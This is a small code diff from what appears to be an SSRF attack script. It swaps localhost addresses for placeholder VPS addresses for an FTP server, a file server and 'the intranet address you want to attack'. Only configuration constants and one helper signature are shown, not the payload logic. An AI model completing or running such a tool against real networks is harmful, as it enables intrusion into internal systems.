@@ -8,9 +8,9 @@ test
 """
 data_size = len(ssrf_data)
 
-ftp_ip = "127.0.0.1:9999"  # Address of ftp server
-sendfile_ip = "127.0.0.1:2560"  # Address of the file server
-ssrf_ip = "127.0.0.1:2333"  # The intranet address you want to attack
+ftp_ip = "vps-ip:vps-port"  # Address of ftp server
+sendfile_ip = "vps-ip:vps-port"  # Address of the file server
+ssrf_ip = "vps-ip:vps-port"  # The intranet address you want to attack
 
 def ip2server(ip):
     host, port = str(ip).split(":")
